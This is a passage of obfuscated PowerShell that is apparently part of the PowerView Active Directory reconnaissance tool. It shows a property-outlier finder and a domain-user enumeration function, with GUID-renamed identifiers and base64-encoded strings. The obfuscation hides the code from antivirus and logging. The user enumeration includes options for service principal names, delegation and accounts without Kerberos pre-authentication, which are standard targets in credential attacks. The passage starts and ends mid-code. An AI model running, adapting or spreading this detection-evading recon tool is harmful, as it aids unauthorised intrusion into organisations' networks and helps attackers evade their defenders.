coding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AcwBlAHIAdgBpAGMAZQBwAGEAYwBrAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AdgBlAHIAcwBpAG8AbgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${15e078f382fd495aad92d62d30486fef} = c57d9aa48a49482b961291cafd0dde18 -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                ${15e078f382fd495aad92d62d30486fef} = c57d9aa48a49482b961291cafd0dde18 -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEUAbgB1AG0AZQByAGEAdABlAGQAIABmAG8AcgBlAHMAdAAgACcAJAB7ADEANQBlADAANwA4AGYAMwA4ADIAZgBkADQAOQA1AGEAYQBkADkAMgBkADYAMgBkADMAMAA0ADgANgBmAGUAZgB9ACcAIABmAG8AcgAgAHQAYQByAGcAZQB0ACAAZABvAG0AYQBpAG4AIAAnACQARABvAG0AYQBpAG4AJwA=')))
        }
        ${5f9be752972148f2bccb4415e1ef5b1f} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${5f9be752972148f2bccb4415e1ef5b1f}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if (${15e078f382fd495aad92d62d30486fef}) {
            ${5f9be752972148f2bccb4415e1ef5b1f}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = ${15e078f382fd495aad92d62d30486fef}
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUAUAByAG8AcABlAHIAdAB5AFMAZQB0AA==')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHMAcABlAGMAaQBmAGkAZQBkACAALQBSAGUAZgBlAHIAZQBuAGMAZQBQAHIAbwBwAGUAcgB0AHkAUwBlAHQA')))
            ${a9aa0dace96644f49072deee340414fa} = $ReferencePropertySet
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUATwBiAGoAZQBjAHQA')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAaQBuAGcAIABwAHIAbwBwAGUAcgB0AHkAIABuAGEAbQBlAHMAIABmAHIAbwBtACAALQBSAGUAZgBlAHIAZQBuAGMAZQBPAGIAagBlAGMAdAAgAHQAbwAgAHUAcwBlACAAYQBzACAAdABoAGUAIAByAGUAZgBlAHIAZQBuAGMAZQAgAHAAcgBvAHAAZQByAHQAeQAgAHMAZQB0AA==')))
            ${a9aa0dace96644f49072deee340414fa} = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
            ${61cf7a930674423ea8f1a45a4885da2d} = $ReferenceObject.objectclass | Select-Object -Last 1
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEMAYQBsAGMAdQBsAGEAdABlAGQAIABSAGUAZgBlAHIAZQBuAGMAZQBPAGIAagBlAGMAdABDAGwAYQBzAHMAIAA6ACAAJAB7ADYAMQBjAGYANwBhADkAMwAwADYANwA0ADQAMgAzAGUAYQA4AGYAMQBhADQANQBhADQAOAA4ADUAZABhADIAZAB9AA==')))
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHQAaABlACAAZABlAGYAYQB1AGwAdAAgAHIAZQBmAGUAcgBlAG4AYwBlACAAcAByAG8AcABlAHIAdAB5ACAAcwBlAHQAIABmAG8AcgAgAHQAaABlACAAbwBiAGoAZQBjAHQAIABjAGwAYQBzAHMAIAAnACQAQwBsAGEAcwBzAE4AYQBtAGUAJwA=')))
        }
        if (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))) -or (${61cf7a930674423ea8f1a45a4885da2d} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))) {
            ${3925dfe11c2845d480668e038f575b8e} = c4bfd1c2423d4aa09ab761a468a38f7e @afd7d337a750465cb1eadfa1f8ae176d
            if (-not ${a9aa0dace96644f49072deee340414fa}) {
                ${a9aa0dace96644f49072deee340414fa} = ${d1671daeb7d747c18cb18101525e4131}
            }
        }
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))) -or (${61cf7a930674423ea8f1a45a4885da2d} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))))) {
            ${3925dfe11c2845d480668e038f575b8e} = d174ca9e2db1482aa71d60f71b8d2690 @afd7d337a750465cb1eadfa1f8ae176d
            if (-not ${a9aa0dace96644f49072deee340414fa}) {
                ${a9aa0dace96644f49072deee340414fa} = ${47606c75b82746f2ac36a1477912f866}
            }
        }
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA==')))) -or (${61cf7a930674423ea8f1a45a4885da2d} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA=='))))) {
            ${3925dfe11c2845d480668e038f575b8e} = cec1def5409041f78ed8ecd436f7fa52 @afd7d337a750465cb1eadfa1f8ae176d
            if (-not ${a9aa0dace96644f49072deee340414fa}) {
                ${a9aa0dace96644f49072deee340414fa} = ${9f0806a1a549491cac775940d73dbbc3}
            }
        }
        else {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEkAbgB2AGEAbABpAGQAIABjAGwAYQBzAHMAOgAgACQAQwBsAGEAcwBzAE4AYQBtAGUA')))
        }
        ForEach ($Object in ${3925dfe11c2845d480668e038f575b8e}) {
            ${819b1b7744a2472cb2177dbd6e99d815} = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach(${d06f9eb07b94487a9b5a6428cfb04ab5} in ${819b1b7744a2472cb2177dbd6e99d815}) {
                if (${a9aa0dace96644f49072deee340414fa} -NotContains ${d06f9eb07b94487a9b5a6428cfb04ab5}) {
                    ${135b3fb143bd49b987991226741987e6} = New-Object PSObject
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Object.SamAccountName
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdAB5AA=='))) ${d06f9eb07b94487a9b5a6428cfb04ab5}
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAGwAdQBlAA=='))) $Object.${d06f9eb07b94487a9b5a6428cfb04ab5}
                    ${135b3fb143bd49b987991226741987e6}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwBwAGUAcgB0AHkATwB1AHQAbABpAGUAcgA='))))
                    ${135b3fb143bd49b987991226741987e6}
                }
            }
        }
    }
}
function c4bfd1c2423d4aa09ab761a468a38f7e {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [Switch]
        ${ad4b28078d594068abb862a63d64bc33},
        [Switch]
        ${b96d612809e84a5e9c95d9e5e1bd7504},
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        ${ce9a9ffc221549d7bb5d5e39e0750b37},
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        ${baf85060923441f0a051110e7f51bea5},
        [Switch]
        ${c0a475f4a80d4b3f8d340cbdeab0d2d1},
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        ${ace5428110194301820d7877fa34d74d},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${598368791be24354b9a053d51b7a6598} = [Enum]::GetNames(${ad9be41dbd0943c2b70046d95a560c23})
        ${598368791be24354b9a053d51b7a6598} = ${598368791be24354b9a053d51b7a6598} | ForEach-Object {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        bef71dfb45ba46c1b577a61e7f67f221 -Name UACFilter -ValidateSet ${598368791be24354b9a053d51b7a6598} -c8f42b8a5203479ba051f687fab516f8 ([array])
    }
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${8b6b7223663c46408c1ab55f22106dd6} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            bef71dfb45ba46c1b577a61e7f67f221 -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${8b6b7223663c46408c1ab55f22106dd6}) {
            ${fb29aaa2f9c140909efae41cb42f1bef} = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                ${56aaa31f880a49e195bcf739ac331528} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQApAA==')))
                }
                elseif (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${7eef0517afe94597af8ab4be39a72451} = ${56aaa31f880a49e195bcf739ac331528}.SubString(${56aaa31f880a49e195bcf739ac331528}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAewA3AGUAZQBmADAANQAxADcAYQBmAGUAOQA0ADUAOQA3AGEAZgA4AGEAYgA0AGIAZQAzADkAYQA3ADIANAA1ADEAfQAnACAAZgByAG8AbQAgACcAJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACcA')))
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${7eef0517afe94597af8ab4be39a72451}
                        ${8b6b7223663c46408c1ab55f22106dd6} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                        if (-not ${8b6b7223663c46408c1ab55f22106dd6}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAZABvAG0AYQBpAG4AIABzAGUAYQByAGMAaABlAHIAIABmAG8AcgAgACcAJAB7ADcAZQBlAGYAMAA1ADEANwBhAGYAZQA5ADQANQA5ADcAYQBmADgAYQBiADQAYgBlADMAOQBhADcAMgA0ADUAMQB9ACcA')))
                        }
                    }
                }
                elseif (${56aaa31f880a49e195bcf739ac331528} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${a58a88389bba4f499974f2986992284e} = (([Guid]${56aaa31f880a49e195bcf739ac331528}).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AGEANQA4AGEAOAA4ADMAOAA5AGIAYgBhADQAZgA0ADkAOQA5ADcANABmADIAOQA4ADYAOQA5ADIAMgA4ADQAZQB9ACkA')))
                }
                elseif (${56aaa31f880a49e195bcf739ac331528}.Contains('\')) {
                    ${742ef5907a3c4a6fa08a69570e3b96f2} = ${56aaa31f880a49e195bcf739ac331528}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | a4ad8c5db2444528bab99963038ffd7c -d6f8ca3d1c994c23b84c147c1aa4c2c9 Canonical
                    if (${742ef5907a3c4a6fa08a69570e3b96f2}) {
                        $UserDomain = ${742ef5907a3c4a6fa08a69570e3b96f2}.SubString(0, ${742ef5907a3c4a6fa08a69570e3b96f2}.IndexOf('/'))
                        ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = ${56aaa31f880a49e195bcf739ac331528}.Split('\')[1]
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAMgA1AGUAMgA2AGMAZABiAGIANwBmAGEANABhADYAYwA5AGEAMgBmADIANAA4ADMAYwAzADQAYgAwADAAZQA2AH0AKQA=')))
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAVQBzAGUAcgBEAG8AbQBhAGkAbgAnACAAZgByAG8AbQAgACcAJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACcA')))
                        ${8b6b7223663c46408c1ab55f22106dd6} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                    }
                }
                else {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                }
            }
            if (${fb29aaa2f9c140909efae41cb42f1bef} -and (${fb29aaa2f9c140909efae41cb42f1bef}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBmAGIAMgA5AGEAYQBhADIAZgA5AGMAMQA0ADAAOQAwADkAZQBmAGEAZQA0ADEAYwBiADQAMgBmADEAYgBlAGYAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAE4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABuAG8AbgAtAG4AdQBsAGwAIABzAGUAcgB2AGkAYwBlACAAcAByAGkAbgBjAGkAcABhAGwAIABuAGEAbQBlAHMA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAqACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
